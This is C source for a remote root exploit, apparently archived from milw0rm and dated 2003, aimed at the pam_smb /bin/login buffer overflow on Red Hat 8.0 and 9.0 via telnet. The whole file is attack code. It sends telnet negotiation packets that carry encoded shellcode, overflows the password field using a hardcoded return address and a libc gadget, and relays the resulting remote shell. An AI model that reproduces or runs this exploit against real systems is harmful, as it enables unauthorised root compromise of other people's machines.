/*
 * Linux pam_lib_smb < 1.1.6  /bin/login exploit
 * by vertex  
 *
 * Tested on Redhat 8.0, 9.0
 * 
 * 
 * Advisory at 
 * 	http://us2.samba.org/samba/ftp/pam_smb/
 *
 * code based on : UC_login.c
 * SunOS 5.6,5.7,5.8 remote /bin/login root exploit
 * [mikecc/unixclan]
 * 
 * =============================================================
 * In order to use pam_lib_smb, need to add following line on top 
 * of /etc/pam.d/login 
 * 
 * auth       required     /lib/security/pam_smb_auth.so
 * 
 * And config the /etc/pam_smb.conf correctly.
 * 
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <arpa/telnet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <unistd.h>
#include <getopt.h>

/* first negotiate */
/* packet capture by ethereal */
char packet_1[] = {
0xff, 0xfd, 0x03, 0xff, 0xfb, 0x18, 0xff, 0xfb, 
0x1f, 0xff, 0xfb, 0x20, 0xff, 0xfb, 0x21, 0xff, 
0xfb, 0x22, 0xff, 0xfb, 0x27, 0xff, 0xfd, 0x05, 
0xff, 0xfb, 0x23 };
char packet_2[] = {
0xff, 0xfa, 0x1f, 0x00, 0x62, 0x00, 0x22, 0xff, 
0xf0, 0xff, 0xfa, 0x20, 0x00, 0x33, 0x38, 0x34, 
0x30, 0x30, 0x2c, 0x33, 0x38, 0x34, 0x30, 0x30, 
0xff, 0xf0, 0xff, 0xfa, 0x23, 0x00, 0x6c, 0x69, 
0x64, 0x73, 

/* in between ,adding sc */
0x3a, 0x30, 0xff, 0xf0, 0xff, 0xfa, 
0x27, 0x00, 0x03, 0x58, 0x41, 0x55, 0x54, 0x48, 
0x4f, 0x52, 0x49, 0x54, 0x59, 0x01, 0x2f, 0x68, 
0x6f, 0x6d, 0x65, 0x2f, 0x78, 0x69, 0x65, 0x2f, 
0x2e, 0x58, 0x61, 0x75, 0x74, 0x68, 0x6f, 0x72, 
0x69, 0x74, 0x79, 0x00, 0x44, 0x49, 0x53, 0x50, 
0x4c, 0x41, 0x59, 0x01, 
};

char packet_2_1[]={

0x6c, 0x69, 0x64, 0x73, 
0x3a, 0x30, 0xff, 0xf0, 0xff, 0xfa, 0x18, 0x00, 
0x58, 0x54, 0x45, 0x52, 0x4d, 0xff, 0xf0 };

/* here is the TERM value */
/*
*/

void login(int);
void negotiate(int);
void sendstr(int,char *,int);
void wont(int sd,int opt);
void will(int sd,int opt);
void cmd(int sd,int opt);

/* ascii shellcode by shellforge (by phillipe biodi)*/
unsigned char sc[] =
"hAAAAX5AAAAHPPPPPPPPahA000X5nCX0PhA004X5nRYZPh0A"
"DAX5owxnPTYI19II19h0200X5U9knPTYII19I19hA000X5sO"
"kBPTY19I19I19h4000X59cF4PTY19II19I19h0000X5000FP"
"TY19I19h0002X500w9PTYI19I19h0A00X5uR00PTYII19I19"
"h04AAX5ByVyPTY19II19I19h600AX59FMVPTY19I19I19h00"
"0AX500LZPTY19II19h00E0X5Btz0PTYII19hA4A0X5R8p9PT"
"Y19I19II19h0D20X5Lx8LPTY19h0000X5000kPh00A0X5fcV"
"0PTYI19I19h00B0X5eFXgPTYI19II19\xff\xff\xe4";


int main(int argc,char **argv)
{
        struct sockaddr_in sock;
        struct hostent *pHe;
        int sd;   
	short port = -1;
	int x;
	char *host = NULL;
	char *user = NULL;
	char exp[1024]; 
	int a;
	char *default_port = "23";

	printf("linux_pam_smb\n");
	printf("Linux lib_pam_smb < 1.1.6 /bin/login remote exploit\n");
	printf("[vertex//lids/org]\n\n");
	if (argc < 2) 
	{
		printf("%s -h <victim> [-p port] \n",argv[0]);
		return 0;
	}
	while ((a = getopt(argc,argv,"h:p:u:")) != -1)
	{
		switch (a)	
		{
			case 'h':
				host = optarg;
				break;
			
                        case 'p':
                                port = atoi(optarg);
                                break;

			default:
				printf("[-] invalid option.\n");
				break;
		}
	}
	if (host == NULL)
	{
		printf("[-] must specify a host to attack\n"); 
		return 0;
        }
	if (port < 0)
		port = atoi(default_port);
	if ((pHe = gethostbyname(host)) == NULL)
        {
                printf("Host lookup error.\n");
                return 0;
        }
	printf("[*] attacking %s:%d\n",host,port);
	printf("[*] opening socket\n");
        if ((sd = socket(AF_INET,SOCK_STREAM,0)) == -1)
        {
                printf("[-] could not create socket");
                return 0;
        }
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	memcpy(&sock.sin_addr.s_addr,pHe->h_addr,pHe->h_length);
	if ((connect(sd,(struct sockaddr *)&sock,sizeof(sock))) == -1)
        {
                printf("[-] failed to connect to %s\n",host);  
                return 0;
        }
	printf("[*] connected!\n");
	printf("[*] Begin negotiate... \n");
	negotiate(sd);
	printf("[*] Login... \n");
	login(sd);
	return 0;
}


void login(int sd)
{
	char buf[1024];
	char exploit_buf[172];
	char cx[3]="\r\n\0";
	int x;
  	fd_set rset;

	memset(exploit_buf,'\0',172);
	/* let's jump to 0xbffffe30 */
	/* eb 30 fe ff bf */

	x = 0;
	exploit_buf[x++]=0x68;
	/* push 0xbffffe30 */
	/* shellcode address */
	exploit_buf[x++]=0x30;
	exploit_buf[x++]=0xfe;
	exploit_buf[x++]=0xff;
	exploit_buf[x++]=0xff;
	exploit_buf[x++]=0xff;
	exploit_buf[x++]=0xbf;
	exploit_buf[x++]=0xbf;
	/* ret */
	exploit_buf[x++]=0xc3;
	
	memset(exploit_buf+x,'A',150);
	x+=150;

/* will jmp in the middle of the NOP */
/* overwrite the eip with 0x40000f4f libc-2.3.2 */
/* at this address it is 
	pop $exx
	pop $exx
	ret 
*/
	exploit_buf[x++]=0xb5;
	exploit_buf[x++]=0xd4;

	sleep(2);

	memset(buf,'\0',sizeof(buf));
	strcpy(buf, "xie\r\n\0");

	printf("[*] sending username \n");
	sendstr(sd,buf,strlen(buf));
	
	sleep(1);
	printf("[*] sending password\n");
	sleep(2);

	memset(buf,'\0',sizeof(buf));
	strcpy(buf, exploit_buf);
	strcat(buf,"\r\n\0");
	sendstr(sd,buf,strlen(buf));

	sleep(2);
	fflush(stdout);
	FD_ZERO(&rset);
	while (1)
	{
		FD_SET(sd,&rset);
		FD_SET(0,&rset); 
		select(sd+1,&rset,0,0,0);
		if (FD_ISSET(sd,&rset)) 
		{
			memset(buf,'\0',sizeof(buf));
			if ((x = read(sd,buf,sizeof(buf)-1)) == 0)
			{
				printf("Connection closed by foreign host.\n");
				exit(-1);
			}
			fprintf(stderr,"%s",buf);
		}
		if (FD_ISSET(0,&rset))
		{
			memset(buf,'\0',sizeof(buf));
			if ((x = read(0,buf,sizeof(buf)-1)) > 0)
			{
				write(sd,buf,x);
			}
		}
	}
}		

/*
 * telnet negotiation needed for
 * talking with the telnet protocol
*/

void negotiate(int sd)
{
	char buf[1024];
	char nop[64];
	int len;

	sendstr(sd, packet_1,sizeof(packet_1));
	sleep(2);

	memset(buf,'\0',sizeof(buf));
	memset(nop,'A',sizeof(nop));
	memcpy(buf,packet_2,sizeof(packet_2));
	/* adding NOP */
	memcpy(buf+sizeof(packet_2), nop, sizeof(nop));
	/* shellcode */
	memcpy(buf+sizeof(packet_2)+sizeof(nop), sc, sizeof(sc));
	/* left packet */
	memcpy(buf+sizeof(packet_2)+sizeof(nop)+sizeof(sc),packet_2_1,sizeof(packet_2_1));
	
	len = sizeof(packet_2) +sizeof(packet_2_1) + sizeof(nop)+sizeof(sc) ;
	sendstr(sd, buf, len);
	sleep(1);
	
	/* wont echo */
	wont(sd,TELOPT_ECHO);
	sleep(1);
	/* do echo */
	cmd(sd,TELOPT_ECHO);

	sleep(2);
}

/* 
 * send a telnet WONT
 *
 * structure of a telnet WONT is:
 * 	1. IAC
 * 	2. WONT
 *	3. what you wont do
 *	(all of the above are found in arpa/telnet.h)
*/

void wont(int sd,int opt)
{
	char buf[3];
	sprintf(buf,"%c%c%c",IAC,WONT,opt);
	write(sd,buf,3); /* no error checking, uh-oh! */
}

/*
 * send a telnet WILL
 *
 * structure of a telnet WILL is:
 *	1. IAC
 *	2. WILL
 *	3. what you will do 
 *	(all of the above are found in arpa/telnet.h)
*/

void will(int sd,int opt)
{
	char buf[3];
	sprintf(buf,"%c%c%c",IAC,WILL,opt);
        write(sd,buf,3); /* no error checking, uh-oh! */
}   
void cmd(int sd,int opt)
{
	char buf[3];
	sprintf(buf,"%c\xfd%c",IAC,opt);
	write(sd,buf,3); /* no error checking, uh-oh! */
}
/*
 *
 */
void sendstr(int sd,char *str,int length)
{

        write(sd,str,length);
	sleep(1);
}


// milw0rm.com [2003-08-29]